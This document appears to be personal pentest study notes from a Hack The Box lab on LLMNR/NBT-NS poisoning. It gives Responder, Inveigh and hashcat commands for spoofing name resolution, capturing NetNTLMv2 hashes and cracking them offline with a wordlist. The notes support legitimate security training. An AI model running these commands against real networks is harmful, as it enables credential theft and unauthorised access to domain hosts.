## LLMNR/NBT-NS Poisoning 

When DNS failed : a machine will try to ask all other machines on the local network
- First with LLMNR
- If LLMNT failed, with NBT-NS

### - from Linux

LLMNR uses 5355 over UDP
NBT-NS uses 137 over UDP

LLMNR (Link-Local Multicast Name Resolution) : Diffusion multicast de noms sur un réseau local (à désactiver sur un réseau d'entreprise si présence d'un serveur DNS et/ou DHCP)

NBT-NS : 

Responder to poison these requests : With network access, we can spoof an authoritative name resolution source in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. The requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password.

--> LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. 

yanisAlb@htb[/htb]$ responder -h
ls --> SMB-NTLMv2-SSP-172.16.5.200.txt

sudo responder -I ens224 
hashcat -m 5600 SMB-NTLMv2-SSP-172.16.5.200.txt /usr/share/wordlists/rockyou.txt 

### - from Windows

Inveigh works similar to Responder, but is written in PowerShell and C#
Inveigh can listen to IPv4 and IPv6 and several other protocols, including LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV, and Proxy Auth. 

PS C:\> cd .\Tools\
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

hashcat -m 5600 Inveigh-NTLMv2.txt /usr/share/wordlists/rockyou.txt

C# Inveigh (InveighZero)
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES

sudo tcpdump -i ens224
